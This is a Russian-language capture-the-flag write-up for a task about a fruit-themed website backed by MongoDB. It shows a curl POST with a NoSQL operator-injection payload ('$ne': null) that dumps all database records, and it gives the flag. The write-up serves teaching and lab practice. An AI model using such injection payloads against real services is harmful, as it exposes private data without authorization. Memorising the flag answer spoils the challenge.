## Таск: Фрукты
_Вот вам сайт одного помешанного на фруктах человека. Даже базу данных для своего проекта он выбрал просто потому что она была созвучна с манго. Оказалось что он не очень то и разбирается в программировании. Найдите и вы в его сайте уязвимость. http://HOST:30008_  
  
В описании сказано, что название базы данных созвучно с манго, гуглим mango database. Первый результат - MongoDB. Это и есть выбранная база данных.  
При отправке запроса браузер делает POST запрос на /get с содержанием JSON. $gte и $lte это указатели на то, что на сервер отправляется именно запрос для БД. Попробуем отправить запрос, который выберет все документы, у которых имя не пустое.
```
$ curl --header "Content-Type: application/json" --request POST --data '{"name":{"$ne": null}}' http://localhost:33008/get
[{"cal":130,"cal_from_fat":0, 
...
{"flag":"CTF{m0ngo_1s_ju5t_l1k3_m4ngo}","name":"The forbidden fruit"}]
``` 
Ответ CTF{m0ngo_1s_ju5t_l1k3_m4ngo}.